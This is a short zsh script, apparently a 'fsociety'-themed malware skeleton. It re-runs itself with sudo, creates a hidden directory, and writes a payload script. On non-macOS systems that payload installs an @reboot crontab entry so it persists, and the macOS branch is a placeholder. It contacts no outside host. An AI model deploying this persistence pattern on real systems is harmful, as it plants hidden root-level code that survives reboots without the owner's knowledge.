#!/bin/zsh

# Check if running as root
if [[ $UID -ne 0 ]]; then
  echo "Elevation required. Re-Running With Sudo"
  sudo zsh "$0" "$@"
  exit $?
fi

# Define directory
TARGET_DIR="${HOME}/.fsociety00"
[[ ! -d "$TARGET_DIR" ]] && mkdir -p "$TARGET_DIR"
cd "$TARGET_DIR"

# Create readme.txt
print "-----readme.txt-----\n\nLEAVE ME HERE\n\n-----readme.txt-----" > readme.txt

# create the payload
cat <<EOF > fsociety_exec.zsh
#!/bin/zsh
# Persistence for macOS
if [[ "\$(uname)" == "Darwin" ]]; then
    # macOS specific persistence logic would go here
    echo "macOS Detected!!"
else
    (crontab -l 2>/dev/null; echo "@reboot $TARGET_DIR/fsociety_exec.zsh") | crontab -
fi
EOF

chmod +x fsociety_exec.zsh

# execute as background process
./fsociety_exec.zsh &! 

exit 0
